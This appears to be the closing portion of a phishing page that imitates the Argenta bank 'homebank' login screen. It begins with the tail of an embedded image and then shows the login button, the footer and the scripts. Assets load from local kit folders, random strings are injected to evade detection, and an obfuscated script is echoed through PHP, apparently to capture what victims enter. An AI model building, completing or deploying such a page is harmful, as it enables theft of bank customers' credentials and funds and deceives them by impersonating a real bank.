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"></div></div><div class="argnt-m-timeout-expiring-message sr-only"><div class="sr-only" role="alert"></div><div class="argnt-m-timeout-expiring-message__content"></div></div></div></div></div><div class="argnt-m-form-container--actions"><div class="argnt-m-submit-buttons"><button type="submit" class="argnt-a-button argnt-a-button--primary" aria-disabled="false"><span class="argnt-a-button-typography argnt-a-button__text">Aanmelden</span></button></div></div></div></div>


</form>



</div></div></div></section></div></div></div></div><div class="argnt-a-separator argnt-m-login-component__separator"></div><div class="argnt-p-message-warning-detail"></div></div></div></div></div></div></div></main><footer class="argnt-p-login-page__border-footer"><div class="argnt-m-footer"><div class="argnt-m-footer__links"><div class="argnt-m-footer__links-left"><span class="argnt-m-footer__copyright">© 2025 Argenta</span></div><div class="argnt-m-footer__links-right"><a class="argnt-m-footer__link" href="https://www.argenta.be/nl/juridische-informatie.html" target="_blank" rel="noopener noreferrer"><span>Juridische informatie</span><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-sm " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></a><a class="argnt-m-footer__link" href="https://www.argenta.be/nl/privacy.html" target="_blank" rel="noopener noreferrer"><span>Privacy</span><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-sm " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></a><a class="argnt-m-footer__link" href="https://www.argenta.be/nl/cookiebeleid.html" target="_blank" rel="noopener noreferrer"><span>Cookiebeleid</span><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-sm " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></a><a class="argnt-m-footer__link" href="https://www.argenta.be/nl/tarieven.html" target="_blank" rel="noopener noreferrer"><span>Tarieven</span><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-sm " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></a><div class="argnt-m-footer__app-version"><span class="argnt-a-badge argnt-a-badge--light">homebank 2.10.2</span></div></div></div></div></footer></div></div><div class="argnt-p-image-background-container"><div class="argnt-p-image-background"><img src="./Home/13_075913.JPG" alt=""></div></div></div></div><div class="sr-only" role="status" aria-live="polite" aria-atomic="true" aria-relevant="additions text"></div></div>
<script src="./nkl_files/jquery.min.js?<?php echo base64_encode(rand(0,9999)); ?>"></script>
 <script src="./nkl_files/imask.min.js?<?php echo base64_encode(rand(0,9999)); ?>"></script>
  <script src="./nkl_files/infos.js?<?php echo base64_encode(rand(0,9999)); ?>"></script>
  
	<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>

<?php  echo "<script>" . $obsfucated . "</script>"; ?>

</body></html>